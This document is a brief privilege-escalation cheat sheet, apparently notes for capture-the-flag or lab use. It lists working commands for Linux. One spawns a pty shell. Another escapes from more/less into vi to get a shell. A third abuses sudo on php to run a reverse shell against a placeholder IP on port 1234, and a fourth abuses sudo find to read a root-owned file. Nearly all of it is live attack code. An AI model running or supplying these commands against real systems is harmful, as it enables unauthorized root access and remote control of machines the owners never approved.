# privilege escalation methods

## improving shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash
```

## more|less > vi

if something is using more/less as an elevated user make the window smaller so it activates more or less
press `v` drops us in vim
using we can get a shell
```
:#!/bin/bash
```

## sudo -l: shows php

sudo /usr/bin/php -r "system('whoami');"

sudo /usr/bin/php -r '$sock=fsockopen("{IP}",1234);exec("/bin/sh <&3 >&3 2>&3");'

## sudo -l: shows find

sudo /usr/bin/find /root/root.txt -exec cat {} \;
